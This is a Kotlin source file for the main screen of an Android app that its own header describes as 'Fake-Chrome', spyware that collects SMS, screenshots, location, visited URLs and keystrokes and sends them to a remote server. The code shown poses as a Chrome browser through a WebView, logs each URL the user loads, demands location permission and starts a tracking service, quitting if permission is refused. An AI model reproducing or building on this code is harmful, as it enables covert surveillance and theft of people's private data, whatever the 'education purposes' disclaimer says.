package com.android.google

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.os.Bundle
import android.view.KeyEvent
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.android.google.databinding.ActivityMainBinding
import com.android.google.services.tracker.Tracker
import com.android.google.utils.logw
import com.android.google.utils.toast
import com.android.google.viewmodel.MainViewModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/*
* Fake-Chrome 30.12.2022
* Collecting data about fake-chrome user
* SMS, Screenshots, Location, Urls, Key log
* Storing data on remote server, using RemoteService
* Ehea - only for "education purposes"
* */

class MainActivity : AppCompatActivity() {

    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding!!

    private val mainViewModel: MainViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        prepareBinding()
        handleOnBackPressed()
    }

    private fun handleOnBackPressed() {
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (binding.webView.canGoBack())
                    binding.webView.goBack()
                else
                    finish()
            }
        })
    }

    private fun prepareBinding() {
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    override fun onStart() {
        super.onStart()

        setWebViewClient()
        loadUrl()
        checkLocationPermission()
    }

    private fun loadUrl() {
        val url = mainViewModel.getUrl()
        binding.webView.loadUrl(url)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setWebViewClient() {
        binding.webView.settings.cacheMode = WebSettings.LOAD_DEFAULT
        binding.webView.settings.javaScriptEnabled = true
        binding.webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) { // Page loaded

                if (BuildConfig.DEBUG) {
                    logw("OnPageFinished: $url")
                }
            }

            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) { // Page loading
                super.onPageStarted(view, url, favicon)

                if (url != null) { // Saving url state
                    mainViewModel.setUrl(url)
                }

                if (BuildConfig.DEBUG) {
                    logw("onPageStarted: $url")
                }
            }
        }
    }

    private fun checkLocationPermission() {
        if (ContextCompat.checkSelfPermission(applicationContext,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            requestPermissionLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)

        }
        else {
            startService(Intent(applicationContext, Tracker::class.java))
        }
    }

    private val requestPermissionLauncher =
        registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { isGranted: Boolean ->
            if (isGranted) {
                startService(Intent(applicationContext, Tracker::class.java))
            } else {
                toast(applicationContext, getString(R.string.location_not_granted))
                finish()
            }
        }

}